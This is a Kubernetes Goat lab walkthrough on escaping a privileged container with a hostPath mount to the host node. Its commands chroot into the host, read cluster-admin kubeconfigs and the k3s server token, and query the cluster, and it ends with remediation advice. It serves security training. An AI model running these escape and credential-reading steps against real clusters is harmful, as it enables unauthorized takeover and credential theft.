---
title: ⎈ Container escape to the host system
sidebar_label: Welcome
sidebar_position: 2
description: Gain access to host system by escaping out of the container in Kubernetes Container - Kubernetes Goat Scenario 🚀
slug: container-escape-to-the-host-system-in-kubernetes-containers/welcome
---

# ⎈ Container escape to the host system

## 🙌 Overview

This scenario showcases the common misconfigurations and one of the error-prone security issues in Kubernetes, container environments, and the general security world. Giving privileges that are not required for things always makes security worse. This is especially true in the containers and Kubernetes world. You can also apply this scenario further and beyond the container to other systems and services based on the configuration and setup of the cluster environments and resources. In this scenario you will see a privileged container escape to gain access to the host system.

![](../images/scenario-4.png)

By the end of the scenario, you will understand and learn the following:

1. Able to exploit the container and escape out of the docker container
2. You will learn to test and exploit the misconfigured and privileged containers
3. Learn about common misconfigurations and possible damage due to them for the containers, Kubernetes, and clusterized environments

### ⚡️ The story

Most of the monitoring, tracing, and debugging software requires extra privileges and capabilities to run. In this scenario, you will see a pod with extra capabilities and privileges including HostPath allowing you to gain access to the host system and provide Node level configuration to gain complete cluster compromise.

:::info

To get started with the scenario, navigate to [http://127.0.0.1:1233](http://127.0.0.1:1233)

:::

![Scenario 4 Welcome](../images/sc-4-1.png)

### 🎯 Goals

The goal of this scenario is to escape out of the running docker container on the host system using the available misconfigurations. The secondary goal is to use the host system-level access to gain other resources access and if possible even go beyond this container, node, and cluster-level access.

:::tip

Gain access to the host system and obtain the node level kubeconfig file `/var/lib/kubelet/kubeconfig`, and query the Kubernetes nodes using the obtained configuration.

:::

### 🪄 Hints & Spoilers

<details>
  <summary><b>✨ Are you still in the container? </b></summary>
  <div>
    <div>See the mounted file systems, also look the capabilities available for the container using <b>capsh</b> 🙌</div>
  </div>
</details>

<details>
  <summary><b>✨ Escaped container? </b></summary>
  <div>
    <div>You can recon the system, some interesting places to obtain the node level configuration are <b>/var/lib/kubelet/kubeconfig</b> and I hope you know how to query Kubernetes API for nodes? 🎉</div>
  </div>
</details>

## 🎉 Solution & Walkthrough

### 🎲 Method 1

- After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as `/host-system` is mounted.

```bash
capsh --print
```

```bash
mount
```

- Now you can explore the mounted file system by navigating to the `/host-system` path

```bash
ls /host-system/
```

![Scenario 4 host system](../images/sc-4-2.png)

- You can gain access to the host system privileges using `chroot`

```bash
chroot /host-system bash
```

- As you can see, now you can access all the host system resources like docker containers, configurations, etc.

```bash
crictl pods
```

![Scenario 4 chroot host](../images/sc-4-3.png)

- The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.

```bash
cat /etc/kubernetes/admin.conf
```

![Scenario 4 kubelet config](../images/sc-4-4.png)

:::tip

You can use the available `kubectl` command-line utility to explore other resources using the obtained configuration. Also, you can leverage lots of other potential things by using the available utilities or downloading them as required.

:::

- Using the kubelet configuration to list the Kubernetes cluster-wide resources

```bash
kubectl --kubeconfig /etc/kubernetes/admin.conf get all -n kube-system
```

![Scenario 4 get kube-system](../images/sc-4-5.png)

:::info

From here you can go beyond by performing the lateral moment and a post-exploitation based on the available setup, configuration, and resources
:::
 e
- You are able to obtain the available nodes in the Kubernetes cluster by running the following command:

```bash
kubectl --kubeconfig /etc/kubernetes/admin.conf get nodes
```

- Hooray 🥳 , now you can see that it returns the cluster nodes available as we have the privilege/permissions with obtained configuration to query the Kubernetes API server

### 🎲 Method 2 (k3s / Rancher Desktop + WSL2)

:::info

Method 1 assumes a `kubeadm`-based cluster. On a **k3s** node (e.g. Rancher Desktop on WSL2) the binaries and config live in different places, so `chroot /host-system bash`, `crictl`, and `/etc/kubernetes/admin.conf` will not be found. Use the paths below instead.

:::

- The host image is minimal and may not ship `bash`. Enter the host with a shell that exists (fall back to `busybox sh` if needed):

```bash
chroot /host-system sh
```

```bash
ls /host-system/bin /host-system/usr/bin | grep -E 'sh$|bash|busybox'
```

- On k3s, `crictl` and `ctr` are bundled into the `k3s` multi-call binary rather than on `PATH`. Call them through `k3s`:

```bash
k3s crictl pods
```

```bash
k3s ctr -a /run/k3s/containerd/containerd.sock containers list
```

- If `k3s` is not on `PATH`, locate the runtime and binaries directly:

```bash
find / -name 'containerd.sock' 2>/dev/null; find / -name 'crictl' -o -name 'k3s' 2>/dev/null | head
```

- The cluster-admin kubeconfig on k3s is **not** at `/etc/kubernetes/admin.conf`. It lives at `/etc/rancher/k3s/k3s.yaml`:

```bash
cat /etc/rancher/k3s/k3s.yaml
```

- Use it to query cluster-wide resources (the `server:` field is usually `https://127.0.0.1:6443`, which works directly from the node):

```bash
k3s kubectl --kubeconfig /etc/rancher/k3s/k3s.yaml get all -n kube-system
```

```bash
k3s kubectl --kubeconfig /etc/rancher/k3s/k3s.yaml get nodes
```

- If the admin kubeconfig is not readable, other node-level credentials worth collecting on k3s are the cluster CA / client certs and the agent join token:

```bash
ls -la /var/lib/rancher/k3s/server/tls/
cat /var/lib/rancher/k3s/server/token
```

:::info

The escalation chain is the same regardless of distribution: one misconfigured pod (hostPath `/` + privileged) → node filesystem → cluster-admin kubeconfig → full cluster compromise. The remediations (no hostPath `/`, drop `privileged`, remove `hostPID`/`hostIPC`, enforce Pod Security Admission `restricted`) break the chain at the first step.

:::


## 🔖 References

- [Realworld case study of exploiting cap_sys_ptrace capability](https://madhuakula.com/content/attacking-and-auditing-docker-containers-using-opensource/attacking-docker-containers/capability.html)
- [Abusing Privileged and Unprivileged Linux Containers - NCC Group Whitepaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
- [Understanding and Hardening Linux Containers - NCC Group Whitepaper](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
